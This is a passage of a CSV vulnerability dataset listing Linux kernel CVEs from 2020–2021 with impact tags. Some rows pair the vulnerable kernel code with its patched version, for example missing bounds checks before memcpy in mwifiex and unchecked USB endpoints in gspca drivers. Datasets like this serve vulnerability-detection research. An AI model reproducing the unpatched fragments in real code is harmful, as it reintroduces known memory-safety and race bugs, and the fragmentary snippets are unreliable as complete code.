		sock->ops = &rawsock_ops;


	sk = sk_alloc(net, PF_NFC, GFP_ATOMIC, nfc_proto->proto, kern);
 if (!sk)
"," if ((sock->type != SOCK_SEQPACKET) && (sock->type != SOCK_RAW))
 return -ESOCKTNOSUPPORT;

 if (sock->type == SOCK_RAW) {
 if (!capable(CAP_NET_RAW))
 return -EPERM;
		sock->ops = &rawsock_raw_ops;
 } else {
		sock->ops = &rawsock_ops;
	}

	sk = sk_alloc(net, PF_NFC, GFP_ATOMIC, nfc_proto->proto, kern);
 if (!sk)
"
2020,Bypass ,CVE-2020-25705,,
2020,DoS ,CVE-2020-25704,,
2021,,CVE-2020-25673,,
2021,,CVE-2020-25672,,
2021,,CVE-2020-25671,,
2021,,CVE-2020-25670,,
2021,,CVE-2020-25669," switch (data) {

 case SUNKBD_RET_RESET:
 schedule_work(&sunkbd->tq);

		sunkbd->reset = -1;
 break;

}

/*
 * sunkbd_reinit() sets leds and beeps to a state the computer remembers they
 * were in.
 */

static void sunkbd_reinit(struct work_struct *work)
{
 struct sunkbd *sunkbd = container_of(work, struct sunkbd, tq);

 wait_event_interruptible_timeout(sunkbd->wait, sunkbd->reset >= 0, HZ);

 serio_write(sunkbd->serio, SUNKBD_CMD_SETLED);
 serio_write(sunkbd->serio,
		(!!test_bit(LED_CAPSL,   sunkbd->dev->led) << 3) |
		SUNKBD_CMD_BELLOFF - !!test_bit(SND_BELL, sunkbd->dev->snd));
}
























static void sunkbd_enable(struct sunkbd *sunkbd, bool enable)
{
 serio_pause_rx(sunkbd->serio);
	sunkbd->enabled = enable;
 serio_continue_rx(sunkbd->serio);





}

/*
"," switch (data) {

 case SUNKBD_RET_RESET:
 if (sunkbd->enabled)
 schedule_work(&sunkbd->tq);
		sunkbd->reset = -1;
 break;

}

/*
 * sunkbd_set_leds_beeps() sets leds and beeps to a state the computer remembers
 * they were in.
 */

static void sunkbd_set_leds_beeps(struct sunkbd *sunkbd)
{




 serio_write(sunkbd->serio, SUNKBD_CMD_SETLED);
 serio_write(sunkbd->serio,
		(!!test_bit(LED_CAPSL,   sunkbd->dev->led) << 3) |
		SUNKBD_CMD_BELLOFF - !!test_bit(SND_BELL, sunkbd->dev->snd));
}


/*
 * sunkbd_reinit() wait for the keyboard reset to complete and restores state
 * of leds and beeps.
 */

static void sunkbd_reinit(struct work_struct *work)
{
 struct sunkbd *sunkbd = container_of(work, struct sunkbd, tq);

 /*
	 * It is OK that we check sunkbd->enabled without pausing serio,
	 * as we only want to catch true->false transition that will
	 * happen once and we will be woken up for it.
 */
 wait_event_interruptible_timeout(sunkbd->wait,
					 sunkbd->reset >= 0 || !sunkbd->enabled,
					 HZ);

 if (sunkbd->reset >= 0 && sunkbd->enabled)
 sunkbd_set_leds_beeps(sunkbd);
}

static void sunkbd_enable(struct sunkbd *sunkbd, bool enable)
{
 serio_pause_rx(sunkbd->serio);
	sunkbd->enabled = enable;
 serio_continue_rx(sunkbd->serio);

 if (!enable) {
 wake_up_interruptible(&sunkbd->wait);
 cancel_work_sync(&sunkbd->tq);
	}
}

/*
"
2021,,CVE-2020-25668,,
2020,,CVE-2020-25656,,
2020,,CVE-2020-25645,,
2020,DoS Overflow Mem. Corr. ,CVE-2020-25643,,
2020,DoS ,CVE-2020-25641,,
2021,,CVE-2020-25639,,
2020,,CVE-2020-25285,,
2020,,CVE-2020-25284,,
2020,,CVE-2020-25221,,
2020,,CVE-2020-25220,,
2020,,CVE-2020-25212,,
2020,Overflow ,CVE-2020-25211,,
2020,,CVE-2020-24394,,
2020,#NAME?,CVE-2020-16166,"
 fast_mix(fast_pool);
 add_interrupt_bench(cycles);


 if (unlikely(crng_init == 0)) {
 if ((fast_pool->count >= 64) &&
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/once.h>


#include <uapi/linux/random.h>

	__u32 s1, s2, s3, s4;
};



u32 prandom_u32_state(struct rnd_state *state);
void prandom_bytes_state(struct rnd_state *state, void *buf, size_t nbytes);
void prandom_seed_full_state(struct rnd_state __percpu *pcpu_state);
#include <linux/sched/debug.h>
#include <linux/slab.h>
#include <linux/compat.h>


#include <linux/uaccess.h>
#include <asm/unistd.h>
 scheduler_tick();
 if (IS_ENABLED(CONFIG_POSIX_TIMERS))
 run_posix_cpu_timers();







}

/**
}
#endif

static DEFINE_PER_CPU(struct rnd_state, net_rand_state) __latent_entropy;

/**
 *	prandom_u32_state - seeded pseudo-random number generator.
","
 fast_mix(fast_pool);
 add_interrupt_bench(cycles);
 this_cpu_add(net_rand_state.s1, fast_pool->pool[cycles & 3]);

 if (unlikely(crng_init == 0)) {
 if ((fast_pool->count >= 64) &&
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/once.h>
#include <linux/percpu.h>

#include <uapi/linux/random.h>

	__u32 s1, s2, s3, s4;
};

DECLARE_PER_CPU(struct rnd_state, net_rand_state) __latent_entropy;

u32 prandom_u32_state(struct rnd_state *state);
void prandom_bytes_state(struct rnd_state *state, void *buf, size_t nbytes);
void prandom_seed_full_state(struct rnd_state __percpu *pcpu_state);
#include <linux/sched/debug.h>
#include <linux/slab.h>
#include <linux/compat.h>
#include <linux/random.h>

#include <linux/uaccess.h>
#include <asm/unistd.h>
 scheduler_tick();
 if (IS_ENABLED(CONFIG_POSIX_TIMERS))
 run_posix_cpu_timers();

 /* The current CPU might make use of net randoms without receiving IRQs
	 * to renew them often enough. Let's update the net_rand_state from a
	 * non-constant value that's not affine to the number of calls to make
	 * sure it's updated when there's some activity (we don't care in idle).
 */
 this_cpu_add(net_rand_state.s1, rol32(jiffies, 24) + user_tick);
}

/**
}
#endif

DEFINE_PER_CPU(struct rnd_state, net_rand_state) __latent_entropy;

/**
 *	prandom_u32_state - seeded pseudo-random number generator.
"
2021,,CVE-2020-16120,,
2021,,CVE-2020-16119,,
2020,,CVE-2020-15852,"void io_bitmap_share(struct task_struct *tsk);
void io_bitmap_exit(struct task_struct *tsk);
















void native_tss_update_io_bitmap(void);

#ifdef CONFIG_PARAVIRT_XXL
#include <asm/paravirt.h>
#else
#define tss_update_io_bitmap native_tss_update_io_bitmap

#endif

#else
}

#ifdef CONFIG_X86_IOPL_IOPERM





static inline void tss_update_io_bitmap(void)
{
 PVOP_VCALL0(cpu.update_io_bitmap);
 void (*load_sp0)(unsigned long sp0);

#ifdef CONFIG_X86_IOPL_IOPERM

 void (*update_io_bitmap)(void);
#endif

	.cpu.swapgs		= native_swapgs,

#ifdef CONFIG_X86_IOPL_IOPERM
	.cpu.update_io_bitmap	= native_tss_update_io_bitmap,

#endif

	.cpu.start_context_switch	= paravirt_nop,
}

#ifdef CONFIG_X86_IOPL_IOPERM
static inline void tss_invalidate_io_bitmap(struct tss_struct *tss)
{
 /*
	 * Invalidate the I/O bitmap by moving io_bitmap_base outside the
	 * TSS limit so any subsequent I/O access from user space will
	 * trigger a #GP.
	 *
	 * This is correct even when VMEXIT rewrites the TSS limit
	 * to 0x67 as the only requirement is that the base points
	 * outside the limit.
 */
	tss->x86_tss.io_bitmap_base = IO_BITMAP_OFFSET_INVALID;
}

static inline void switch_to_bitmap(unsigned long tifp)
{
 /*
	 * user mode.
 */
 if (tifp & _TIF_IO_BITMAP)
 tss_invalidate_io_bitmap(this_cpu_ptr(&cpu_tss_rw));
}

static void tss_copy_io_bitmap(struct tss_struct *tss, struct io_bitmap *iobm)
	u16 *base = &tss->x86_tss.io_bitmap_base;

 if (!test_thread_flag(TIF_IO_BITMAP)) {
 tss_invalidate_io_bitmap(tss);
 return;
	}

}

#ifdef CONFIG_X86_IOPL_IOPERM











static void xen_update_io_bitmap(void)
{
 struct physdev_set_iobitmap iobitmap;
	.load_sp0 = xen_load_sp0,

#ifdef CONFIG_X86_IOPL_IOPERM

	.update_io_bitmap = xen_update_io_bitmap,
#endif
	.io_delay = xen_io_delay,
","void io_bitmap_share(struct task_struct *tsk);
void io_bitmap_exit(struct task_struct *tsk);

static inline void native_tss_invalidate_io_bitmap(void)
{
 /*
	 * Invalidate the I/O bitmap by moving io_bitmap_base outside the
	 * TSS limit so any subsequent I/O access from user space will
	 * trigger a #GP.
	 *
	 * This is correct even when VMEXIT rewrites the TSS limit
	 * to 0x67 as the only requirement is that the base points
	 * outside the limit.
 */
 this_cpu_write(cpu_tss_rw.x86_tss.io_bitmap_base,
		       IO_BITMAP_OFFSET_INVALID);
}

void native_tss_update_io_bitmap(void);

#ifdef CONFIG_PARAVIRT_XXL
#include <asm/paravirt.h>
#else
#define tss_update_io_bitmap native_tss_update_io_bitmap
#define tss_invalidate_io_bitmap native_tss_invalidate_io_bitmap
#endif

#else
}

#ifdef CONFIG_X86_IOPL_IOPERM
static inline void tss_invalidate_io_bitmap(void)
{
 PVOP_VCALL0(cpu.invalidate_io_bitmap);
}

static inline void tss_update_io_bitmap(void)
{
 PVOP_VCALL0(cpu.update_io_bitmap);
 void (*load_sp0)(unsigned long sp0);

#ifdef CONFIG_X86_IOPL_IOPERM
 void (*invalidate_io_bitmap)(void);
 void (*update_io_bitmap)(void);
#endif

	.cpu.swapgs		= native_swapgs,

#ifdef CONFIG_X86_IOPL_IOPERM
	.cpu.invalidate_io_bitmap	= native_tss_invalidate_io_bitmap,
	.cpu.update_io_bitmap		= native_tss_update_io_bitmap,
#endif

	.cpu.start_context_switch	= paravirt_nop,
}

#ifdef CONFIG_X86_IOPL_IOPERM














static inline void switch_to_bitmap(unsigned long tifp)
{
 /*
	 * user mode.
 */
 if (tifp & _TIF_IO_BITMAP)
 tss_invalidate_io_bitmap();
}

static void tss_copy_io_bitmap(struct tss_struct *tss, struct io_bitmap *iobm)
	u16 *base = &tss->x86_tss.io_bitmap_base;

 if (!test_thread_flag(TIF_IO_BITMAP)) {
 native_tss_invalidate_io_bitmap();
 return;
	}

}

#ifdef CONFIG_X86_IOPL_IOPERM
static void xen_invalidate_io_bitmap(void)
{
 struct physdev_set_iobitmap iobitmap = {
		.bitmap = 0,
		.nr_ports = 0,
	};

 native_tss_invalidate_io_bitmap();
 HYPERVISOR_physdev_op(PHYSDEVOP_set_iobitmap, &iobitmap);
}

static void xen_update_io_bitmap(void)
{
 struct physdev_set_iobitmap iobitmap;
	.load_sp0 = xen_load_sp0,

#ifdef CONFIG_X86_IOPL_IOPERM
	.invalidate_io_bitmap = xen_invalidate_io_bitmap,
	.update_io_bitmap = xen_update_io_bitmap,
#endif
	.io_delay = xen_io_delay,
"
2020,Bypass ,CVE-2020-15780,,
2020,DoS ,CVE-2020-15437,,
2020,DoS +Priv ,CVE-2020-15436,,
2020,,CVE-2020-15393,,
2020,,CVE-2020-14416,,
2020,DoS Mem. Corr. ,CVE-2020-14390,,
2020,#NAME?,CVE-2020-14386,,
2020,DoS ,CVE-2020-14385,,
2020,,CVE-2020-14381,,
2020,,CVE-2020-14356,,
2020,,CVE-2020-14351,,
2020,,CVE-2020-14331,,
2020,,CVE-2020-14314,,
2020,DoS ,CVE-2020-14305,,
2020,,CVE-2020-14304,,
2020,Overflow ,CVE-2020-13974,,
2020,,CVE-2020-13143,,
2020,,CVE-2020-12888,,
2020,Overflow ,CVE-2020-12826,"
 /* An exec changes our domain. We are no longer part of the thread
	   group */
	current->self_exec_id++;
 flush_signal_handlers(current, 0);
}
EXPORT_SYMBOL(setup_new_exec);
 struct seccomp			seccomp;

 /* Thread group tracking: */
 u32				parent_exec_id;
 u32				self_exec_id;

 /* Protection against (de-)allocation: mm, files, fs, tty, keyrings, mems_allowed, mempolicy: */
 spinlock_t			alloc_lock;
		 * This is only possible if parent == real_parent.
		 * Check if it has changed security domain.
 */
 if (tsk->parent_exec_id != tsk->parent->self_exec_id)
			sig = SIGCHLD;
	}

","
 /* An exec changes our domain. We are no longer part of the thread
	   group */
 WRITE_ONCE(current->self_exec_id, current->self_exec_id + 1);
 flush_signal_handlers(current, 0);
}
EXPORT_SYMBOL(setup_new_exec);
 struct seccomp			seccomp;

 /* Thread group tracking: */
 u64				parent_exec_id;
 u64				self_exec_id;

 /* Protection against (de-)allocation: mm, files, fs, tty, keyrings, mems_allowed, mempolicy: */
 spinlock_t			alloc_lock;
		 * This is only possible if parent == real_parent.
		 * Check if it has changed security domain.
 */
 if (tsk->parent_exec_id != READ_ONCE(tsk->parent->self_exec_id))
			sig = SIGCHLD;
	}

"
2020,,CVE-2020-12771,,
2020,,CVE-2020-12770,,
2020,,CVE-2020-12769,,
2020,,CVE-2020-12768,,
2020,,CVE-2020-12659,"	u32 chunk_size = mr->chunk_size, headroom = mr->headroom;
 unsigned int chunks, chunks_per_page;
	u64 addr = mr->addr, size = mr->len;
 int size_chk, err;

 if (chunk_size < XDP_UMEM_MIN_CHUNK_SIZE || chunk_size > PAGE_SIZE) {
 /* Strictly speaking we could support this, if:
 return -EINVAL;
	}

	size_chk = chunk_size - headroom - XDP_PACKET_HEADROOM;
 if (size_chk < 0)
 return -EINVAL;

	umem->address = (unsigned long)addr;
","	u32 chunk_size = mr->chunk_size, headroom = mr->headroom;
 unsigned int chunks, chunks_per_page;
	u64 addr = mr->addr, size = mr->len;
 int err;

 if (chunk_size < XDP_UMEM_MIN_CHUNK_SIZE || chunk_size > PAGE_SIZE) {
 /* Strictly speaking we could support this, if:
 return -EINVAL;
	}

 if (headroom >= chunk_size - XDP_PACKET_HEADROOM)

 return -EINVAL;

	umem->address = (unsigned long)addr;
"
2020,,CVE-2020-12657," return bfqq;
}

static void bfq_idle_slice_timer_body(struct bfq_queue *bfqq)

{
 struct bfq_data *bfqd = bfqq->bfqd;
 enum bfqq_expiration reason;
 unsigned long flags;

 spin_lock_irqsave(&bfqd->lock, flags);
 bfq_clear_bfqq_wait_request(bfqq);








 if (bfqq != bfqd->in_service_queue) {
 spin_unlock_irqrestore(&bfqd->lock, flags);
 return;
	}



 if (bfq_bfqq_budget_timeout(bfqq))
 /*
		 * Also here the queue can be safely expired
	 * early.
 */
 if (bfqq)
 bfq_idle_slice_timer_body(bfqq);

 return HRTIMER_NORESTART;
}
"," return bfqq;
}

static void
bfq_idle_slice_timer_body(struct bfq_data *bfqd, struct bfq_queue *bfqq)
{

 enum bfqq_expiration reason;
 unsigned long flags;

 spin_lock_irqsave(&bfqd->lock, flags);


 /*
	 * Considering that bfqq may be in race, we should firstly check
	 * whether bfqq is in service before doing something on it. If
	 * the bfqq in race is not in service, it has already been expired
	 * through __bfq_bfqq_expire func and its wait_request flags has
	 * been cleared in __bfq_bfqd_reset_in_service func.
 */
 if (bfqq != bfqd->in_service_queue) {
 spin_unlock_irqrestore(&bfqd->lock, flags);
 return;
	}

 bfq_clear_bfqq_wait_request(bfqq);

 if (bfq_bfqq_budget_timeout(bfqq))
 /*
		 * Also here the queue can be safely expired
	 * early.
 */
 if (bfqq)
 bfq_idle_slice_timer_body(bfqd, bfqq);

 return HRTIMER_NORESTART;
}
"
2020,,CVE-2020-12656,,
2020,,CVE-2020-12655," be32_to_cpu(agf->agf_flcount) <= xfs_agfl_size(mp)))
 return __this_address;








 if (be32_to_cpu(agf->agf_levels[XFS_BTNUM_BNO]) < 1 ||
 be32_to_cpu(agf->agf_levels[XFS_BTNUM_CNT]) < 1 ||
 be32_to_cpu(agf->agf_levels[XFS_BTNUM_BNO]) > XFS_BTREE_MAXLEVELS ||
 be32_to_cpu(agf->agf_levels[XFS_BTNUM_RMAP]) > XFS_BTREE_MAXLEVELS))
 return __this_address;





 /*
	 * during growfs operations, the perag is not fully initialised,
	 * so we can't use it for any useful checking. growfs ensures we can't
 be32_to_cpu(agf->agf_btreeblks) > be32_to_cpu(agf->agf_length))
 return __this_address;






 if (xfs_sb_version_hasreflink(&mp->m_sb) &&
	    (be32_to_cpu(agf->agf_refcount_level) < 1 ||
 be32_to_cpu(agf->agf_refcount_level) > XFS_BTREE_MAXLEVELS))
"," be32_to_cpu(agf->agf_flcount) <= xfs_agfl_size(mp)))
 return __this_address;

 if (be32_to_cpu(agf->agf_length) > mp->m_sb.sb_dblocks)
 return __this_address;

 if (be32_to_cpu(agf->agf_freeblks) < be32_to_cpu(agf->agf_longest) ||
 be32_to_cpu(agf->agf_freeblks) > be32_to_cpu(agf->agf_length))
 return __this_address;

 if (be32_to_cpu(agf->agf_levels[XFS_BTNUM_BNO]) < 1 ||
 be32_to_cpu(agf->agf_levels[XFS_BTNUM_CNT]) < 1 ||
 be32_to_cpu(agf->agf_levels[XFS_BTNUM_BNO]) > XFS_BTREE_MAXLEVELS ||
 be32_to_cpu(agf->agf_levels[XFS_BTNUM_RMAP]) > XFS_BTREE_MAXLEVELS))
 return __this_address;

 if (xfs_sb_version_hasrmapbt(&mp->m_sb) &&
 be32_to_cpu(agf->agf_rmap_blocks) > be32_to_cpu(agf->agf_length))
 return __this_address;

 /*
	 * during growfs operations, the perag is not fully initialised,
	 * so we can't use it for any useful checking. growfs ensures we can't
 be32_to_cpu(agf->agf_btreeblks) > be32_to_cpu(agf->agf_length))
 return __this_address;

 if (xfs_sb_version_hasreflink(&mp->m_sb) &&
 be32_to_cpu(agf->agf_refcount_blocks) >
 be32_to_cpu(agf->agf_length))
 return __this_address;

 if (xfs_sb_version_hasreflink(&mp->m_sb) &&
	    (be32_to_cpu(agf->agf_refcount_level) < 1 ||
 be32_to_cpu(agf->agf_refcount_level) > XFS_BTREE_MAXLEVELS))
"
2020,Overflow ,CVE-2020-12654," ""WMM Parameter Set Count: %d\n"",
				    wmm_param_ie->qos_info_bitmap & mask);





 memcpy((u8 *) &priv->curr_bss_params.bss_descriptor.
			       wmm_ie, wmm_param_ie,
			       wmm_param_ie->vend_hdr.len + 2);
"," ""WMM Parameter Set Count: %d\n"",
				    wmm_param_ie->qos_info_bitmap & mask);

 if (wmm_param_ie->vend_hdr.len + 2 >
 sizeof(struct ieee_types_wmm_parameter))
 break;

 memcpy((u8 *) &priv->curr_bss_params.bss_descriptor.
			       wmm_ie, wmm_param_ie,
			       wmm_param_ie->vend_hdr.len + 2);
"
2020,DoS Overflow +Priv ,CVE-2020-12653,"			vs_param_set->header.len =
 cpu_to_le16((((u16) priv->vs_ie[id].ie[1])
				& 0x00FF) + 2);







 memcpy(vs_param_set->ie, priv->vs_ie[id].ie,
 le16_to_cpu(vs_param_set->header.len));
			*buffer += le16_to_cpu(vs_param_set->header.len) +
","			vs_param_set->header.len =
 cpu_to_le16((((u16) priv->vs_ie[id].ie[1])
				& 0x00FF) + 2);
 if (le16_to_cpu(vs_param_set->header.len) >
				MWIFIEX_MAX_VSIE_LEN) {
 mwifiex_dbg(priv->adapter, ERROR,
 ""Invalid param length!\n"");
 break;
			}

 memcpy(vs_param_set->ie, priv->vs_ie[id].ie,
 le16_to_cpu(vs_param_set->header.len));
			*buffer += le16_to_cpu(vs_param_set->header.len) +
"
2020,,CVE-2020-12652,,
2020,Overflow ,CVE-2020-12465," struct page *page = virt_to_head_page(data);
 int offset = data - page_address(page);
 struct sk_buff *skb = q->rx_head;


	offset += q->buf_offset;
 skb_add_rx_frag(skb, skb_shinfo(skb)->nr_frags, page, offset, len,
			q->buf_size);



 if (more)
 return;
"," struct page *page = virt_to_head_page(data);
 int offset = data - page_address(page);
 struct sk_buff *skb = q->rx_head;
 struct skb_shared_info *shinfo = skb_shinfo(skb);

 if (shinfo->nr_frags < ARRAY_SIZE(shinfo->frags)) {
		offset += q->buf_offset;
 skb_add_rx_frag(skb, shinfo->nr_frags, page, offset, len,
				q->buf_size);
	}

 if (more)
 return;
"
2020,,CVE-2020-12464," int i, retval;

 spin_lock_irqsave(&io->lock, flags);
 if (io->status) {
 spin_unlock_irqrestore(&io->lock, flags);
 return;
	}
 /* shut everything down */
	io->status = -ECONNRESET;

 spin_unlock_irqrestore(&io->lock, flags);

 for (i = io->entries - 1; i >= 0; --i) {
 dev_warn(&io->dev->dev, ""%s, unlink --> %d\n"",
				 __func__, retval);
	}






}
EXPORT_SYMBOL_GPL(usb_sg_cancel);

"," int i, retval;

 spin_lock_irqsave(&io->lock, flags);
 if (io->status || io->count == 0) {
 spin_unlock_irqrestore(&io->lock, flags);
 return;
	}
 /* shut everything down */
	io->status = -ECONNRESET;
	io->count++;		/* Keep the request alive until we're done */
 spin_unlock_irqrestore(&io->lock, flags);

 for (i = io->entries - 1; i >= 0; --i) {
 dev_warn(&io->dev->dev, ""%s, unlink --> %d\n"",
				 __func__, retval);
	}

 spin_lock_irqsave(&io->lock, flags);
	io->count--;
 if (!io->count)
 complete(&io->complete);
 spin_unlock_irqrestore(&io->lock, flags);
}
EXPORT_SYMBOL_GPL(usb_sg_cancel);

"
2020,,CVE-2020-12351,,
2020,DoS ,CVE-2020-12114,,
2020,Exec Code ,CVE-2020-11884,,
2020,,CVE-2020-11725,,
2020,,CVE-2020-11669,"	bne-	core_idle_lock_held
	blr

/* Reuse an unused pt_regs slot for IAMR */

#define PNV_POWERSAVE_IAMR	_DAR



/*
 * Pass requested state in r3:
	SAVE_NVGPRS(r1)

BEGIN_FTR_SECTION

	mfspr	r5, SPRN_IAMR


 std	r5, PNV_POWERSAVE_IAMR(r1)





END_FTR_SECTION_IFSET(CPU_FTR_ARCH_207S)

	mfcr	r5
	REST_GPR(2, r1)

BEGIN_FTR_SECTION
	/* IAMR was saved in pnv_powersave_common() */

	ld	r5, PNV_POWERSAVE_IAMR(r1)


	mtspr	SPRN_IAMR, r5





	/*
	 * We don't need an isync here because the upcoming mtmsrd is
	 * execution synchronizing.
	 */
END_FTR_SECTION_IFSET(CPU_FTR_ARCH_207S)

","	bne-	core_idle_lock_held
	blr

/* Reuse some unused pt_regs slots for AMR/IAMR/UAMOR/UAMOR */
#define PNV_POWERSAVE_AMR	_TRAP
#define PNV_POWERSAVE_IAMR	_DAR
#define PNV_POWERSAVE_UAMOR	_DSISR
#define PNV_POWERSAVE_AMOR	RESULT

/*
 * Pass requested state in r3:
	SAVE_NVGPRS(r1)

BEGIN_FTR_SECTION
	mfspr	r4, SPRN_AMR
	mfspr	r5, SPRN_IAMR
	mfspr	r6, SPRN_UAMOR
 std	r4, PNV_POWERSAVE_AMR(r1)
 std	r5, PNV_POWERSAVE_IAMR(r1)
 std	r6, PNV_POWERSAVE_UAMOR(r1)
BEGIN_FTR_SECTION_NESTED(42)
	mfspr	r7, SPRN_AMOR
 std	r7, PNV_POWERSAVE_AMOR(r1)
END_FTR_SECTION_NESTED_IFSET(CPU_FTR_HVMODE, 42)
END_FTR_SECTION_IFSET(CPU_FTR_ARCH_207S)

	mfcr	r5
	REST_GPR(2, r1)

BEGIN_FTR_SECTION
	/* These regs were saved in pnv_powersave_common() */
	ld	r4, PNV_POWERSAVE_AMR(r1)
	ld	r5, PNV_POWERSAVE_IAMR(r1)
	ld	r6, PNV_POWERSAVE_UAMOR(r1)
	mtspr	SPRN_AMR, r4
	mtspr	SPRN_IAMR, r5
	mtspr	SPRN_UAMOR, r6
BEGIN_FTR_SECTION_NESTED(42)
	ld	r7, PNV_POWERSAVE_AMOR(r1)
	mtspr	SPRN_AMOR, r7
END_FTR_SECTION_NESTED_IFSET(CPU_FTR_HVMODE, 42)
	/*
	 * We don't need an isync here after restoring IAMR because the upcoming
	 * mtmsrd is execution synchronizing.
	 */
END_FTR_SECTION_IFSET(CPU_FTR_ARCH_207S)

"
2020,,CVE-2020-11668," return -EIO;
	}




 return le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
}


static int sd_isoc_init(struct gspca_dev *gspca_dev)
{

 struct usb_host_interface *alt;
 int max_packet_size;

 break;
	}











 /* Start isoc bandwidth ""negotiation"" at max isoc bandwidth */
	alt = &gspca_dev->dev->actconfig->intf_cache[0]->altsetting[1];
	alt->endpoint[0].desc.wMaxPacketSize = cpu_to_le16(max_packet_size);

 return 0;
 break;
	}




	alt = &gspca_dev->dev->actconfig->intf_cache[0]->altsetting[1];
	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
 if (packet_size <= min_packet_size)
"," return -EIO;
	}

 if (alt->desc.bNumEndpoints < 1)
 return -ENODEV;

 return le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
}


static int sd_isoc_init(struct gspca_dev *gspca_dev)
{
 struct usb_interface_cache *intfc;
 struct usb_host_interface *alt;
 int max_packet_size;

 break;
	}

	intfc = gspca_dev->dev->actconfig->intf_cache[0];

 if (intfc->num_altsetting < 2)
 return -ENODEV;

	alt = &intfc->altsetting[1];

 if (alt->desc.bNumEndpoints < 1)
 return -ENODEV;

 /* Start isoc bandwidth ""negotiation"" at max isoc bandwidth */

	alt->endpoint[0].desc.wMaxPacketSize = cpu_to_le16(max_packet_size);

 return 0;
 break;
	}

 /*
	 * Existence of altsetting and endpoint was verified in sd_isoc_init()
 */
	alt = &gspca_dev->dev->actconfig->intf_cache[0]->altsetting[1];
	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
 if (packet_size <= min_packet_size)
"
2020,,CVE-2020-11609," return -EIO;
	}




	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
	err = stv06xx_write_bridge(sd, STV_ISO_SIZE_L, packet_size);
 if (err < 0)

static int stv06xx_isoc_init(struct gspca_dev *gspca_dev)
{

 struct usb_host_interface *alt;
 struct sd *sd = (struct sd *) gspca_dev;











 /* Start isoc bandwidth ""negotiation"" at max isoc bandwidth */
	alt = &gspca_dev->dev->actconfig->intf_cache[0]->altsetting[1];
	alt->endpoint[0].desc.wMaxPacketSize =
 cpu_to_le16(sd->sensor->max_packet_size[gspca_dev->curr_mode]);

 struct usb_host_interface *alt;
 struct sd *sd = (struct sd *) gspca_dev;





	alt = &gspca_dev->dev->actconfig->intf_cache[0]->altsetting[1];
	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
	min_packet_size = sd->sensor->min_packet_size[gspca_dev->curr_mode];
	alt = usb_altnum_to_altsetting(intf, sd->gspca_dev.alt);
 if (!alt)
 return -ENODEV;




	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);

 /* If we don't have enough bandwidth use a lower framerate */
"," return -EIO;
	}

 if (alt->desc.bNumEndpoints < 1)
 return -ENODEV;

	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
	err = stv06xx_write_bridge(sd, STV_ISO_SIZE_L, packet_size);
 if (err < 0)

static int stv06xx_isoc_init(struct gspca_dev *gspca_dev)
{
 struct usb_interface_cache *intfc;
 struct usb_host_interface *alt;
 struct sd *sd = (struct sd *) gspca_dev;

	intfc = gspca_dev->dev->actconfig->intf_cache[0];

 if (intfc->num_altsetting < 2)
 return -ENODEV;

	alt = &intfc->altsetting[1];

 if (alt->desc.bNumEndpoints < 1)
 return -ENODEV;

 /* Start isoc bandwidth ""negotiation"" at max isoc bandwidth */

	alt->endpoint[0].desc.wMaxPacketSize =
 cpu_to_le16(sd->sensor->max_packet_size[gspca_dev->curr_mode]);

 struct usb_host_interface *alt;
 struct sd *sd = (struct sd *) gspca_dev;

 /*
	 * Existence of altsetting and endpoint was verified in
	 * stv06xx_isoc_init()
 */
	alt = &gspca_dev->dev->actconfig->intf_cache[0]->altsetting[1];
	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
	min_packet_size = sd->sensor->min_packet_size[gspca_dev->curr_mode];
	alt = usb_altnum_to_altsetting(intf, sd->gspca_dev.alt);
 if (!alt)
 return -ENODEV;

 if (alt->desc.bNumEndpoints < 1)
 return -ENODEV;

	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);

 /* If we don't have enough bandwidth use a lower framerate */
"
2020,,CVE-2020-11608," return;
	}






	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
 reg_w(sd, R51x_FIFO_PSIZE, packet_size >> 5);

 return;
	}






	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
 ov518_reg_w32(sd, R51x_FIFO_PSIZE, packet_size & ~7, 2);

"," return;
	}

 if (alt->desc.bNumEndpoints < 1) {
		sd->gspca_dev.usb_err = -ENODEV;
 return;
	}

	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
 reg_w(sd, R51x_FIFO_PSIZE, packet_size >> 5);

 return;
	}

 if (alt->desc.bNumEndpoints < 1) {
		sd->gspca_dev.usb_err = -ENODEV;
 return;
	}

	packet_size = le16_to_cpu(alt->endpoint[0].desc.wMaxPacketSize);
 ov518_reg_w32(sd, R51x_FIFO_PSIZE, packet_size & ~7, 2);

"
2020,,CVE-2020-11565," switch (mode) {
 case MPOL_PREFERRED:
 /*
		 * Insist on a nodelist of one node only


 */
 if (nodelist) {
 char *rest = nodelist;
 while (isdigit(*rest))
				rest++;
 if (*rest)
 goto out;


		}
 break;
 case MPOL_INTERLEAVE:
"," switch (mode) {
 case MPOL_PREFERRED:
 /*
		 * Insist on a nodelist of one node only, although later
		 * we use first_node(nodes) to grab a single node, so here
		 * nodelist (or nodes) cannot be empty.
 */
 if (nodelist) {
 char *rest = nodelist;
 while (isdigit(*rest))
				rest++;
 if (*rest)
 goto out;
 if (nodes_empty(nodes))
 goto out;
		}
 break;
 case MPOL_INTERLEAVE:
"
2020,#NAME?,CVE-2020-11494,"	u32 tmpid;
 char *cmd = sl->rbuff;

 cf.can_id = 0;

 switch (*cmd) {
 case 'r':
 else
 return;

	*(u64 *) (&cf.data) = 0; /* clear payload */

 /* RTR frames may have a dlc > 0 but they never have any data bytes */
 if (!(cf.can_id & CAN_RTR_FLAG)) {
 for (i = 0; i < cf.can_dlc; i++) {
","	u32 tmpid;
 char *cmd = sl->rbuff;

 memset(&cf, 0, sizeof(cf));

 switch (*cmd) {
 case 'r':
 else
 return;



 /* RTR frames may have a dlc > 0 but they never have any data bytes */
 if (!(cf.can_id & CAN_RTR_FLAG)) {
 for (i = 0; i < cf.can_dlc; i++) {
"
